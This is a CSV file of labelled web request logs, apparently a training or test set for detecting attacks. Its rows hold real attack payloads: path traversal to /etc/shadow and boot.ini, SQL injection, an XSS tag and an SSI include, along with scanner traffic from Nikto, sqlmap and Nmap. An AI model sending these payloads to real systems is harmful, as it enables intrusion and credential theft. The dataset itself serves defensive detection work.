Log_Number,payload,label_action
0,"GET /forum1_professionnel.asp?n=/.\\\""./.\\\""./.\\\""./.\\\""./.\\\""./boot.ini&amp;nn=100&amp;page=1|234|800a0bcd|Either_BOF_or_EOF_is_True__or_the_current_record_has_been_deleted._Requested_operation_requires_a_current_record. HTTP/1.1\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:002421)\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 36\r\nHost: 10.0.17.21\r\n\r\n<!--#include virtual=\""/indomainabc063.jsp\""-->",System_Cmd_Execution
2,"GET /goods/goods_search?display_type=list&arr_search_list%5B0%5D%5Bsearch_type%5D=-1839%20or%201%3D2&arr_search_list%5B0%5D%5Bsearch%5D=1&arr_search_list%5B1%5D%5Bsearch_type%5D=Gm.name&arr_search_list%5B1%5D%5Bsearch%5D=1&arr_search_list%5B2%5D%5Bsearch_type%5D=Gm.name&arr_search_list%5B2%5D%5Bsearch%5D=1&search_include=y&search=1&search_type=Gm.name HTTP/1.1\r\nHost: www.college.school\r\nAuthorization: Negotiate TlRMTVNTUAABAAAAt4II4gAAAAAAAAAAAAAAAAAAAAAKAF1YAAAADw==\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: Mozilla/5.0 (Gecko) Arachni/v10.0.0.80\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.8,he;q=0.6\r\nX-Arachni-Scan-Seed: 4818b1cc56353e785f9bfe9b055b7183\r\nCookie: designart_site=cg0q4hq5j1rgo9o2ns7s3nsnjlauq1rp\r\n\r\n",SQL_Injection
3,GET / HTTP/1.1\r\n\r\n,HOST_Scan
5,"POST /member/login HTTP/1.1\r\nContent-Length: 197\r\nCache-Control: no-cache\r\nUser-Agent: sqlmap/1.6.7#stable (https://sqlmap.org)\r\nReferer: http://www.mall.shop:80/member/login\r\nHost: www.mall.shop\r\nAccept: */*\r\nAccept-Encoding: gzip,deflate\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\nConnection: close\r\n\r\n",Vulnerability_Scan
11,GET /../../../../../../../../../../../../etc/shadow HTTP/1.1\r\nHost: 10.0.17.21\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:dishwasher)\r\n\r\n,Path_Disclosure
15,GET /promotion/event?event_name=ZAP&sc_filter=sales&sc_status=%3C%2Fscript%3E%3Cimg+src%3Dx+onerror%3Dprompt%28%29%3E%3Cscript%3E HTTP/1.1\r\nHost: www.mall.shop\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nReferer: http://www.mall.shop/promotion/event\r\nCookie: shopReferer=; today_view=a%3A15%3A%7Bi%3A0%3Bi%3A38%3Bi%3A1%3Bi%3A47%3Bi%3A2%3Bi%3A41%3Bi%3A3%3Bi%3A56%3Bi%3A4%3Bi%3A51%3Bi%3A5%3Bi%3A42%3Bi%3A6%3Bi%3A79%3Bi%3A7%3Bi%3A43%3Bi%3A8%3Bi%3A77%3Bi%3A9%3Bi%3A75%3Bi%3A10%3Bi%3A68%3Bi%3A11%3Bi%3A54%3Bi%3A12%3Bi%3A70%3Bi%3A13%3Bi%3A55%3Bi%3A14%3Bi%3A52%3B%7D; marketplace=direct\r\nContent-Length: 0\r\n\r\n,Cross_Site_Scripting
23,"GET /upload/conf/garden_logo_R0c_icon.ico HTTP/1.1\r\nHost: www.college.school\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/10.0.2.42 Safari/537.36\r\nAccept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8\r\nReferer: http://www.college.school/\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\nCookie: designart_site=ko5om3f4ph6i987f2krd79dabgfc7spc\r\nIf-Modified-Since: Tue, 20 Dec 2022 01:41:55 GMT\r\n\r\n",Leakage_Through_NW
62,"GET /lib/smarteditor2-master/workspace/src/ HTTP/1.1\r\nHost: www.college.school:8080\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/10.0.2.4 Safari/537.36 Edg/107.0.1418.26\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nReferer: http://www.college.school:8080/lib/smarteditor2-master/workspace/\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCookie: designart_site=g374g3v6ag5ee3s0mpiu9o5rah130k0n\r\n\r\n",Directory_Indexing
7026,GET /bin/ HTTP/1.1\r\nConnection: close\r\nHost: 10.0.17.20\r\nUser-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\r\n\r\n,Automatically_Searching_Infor
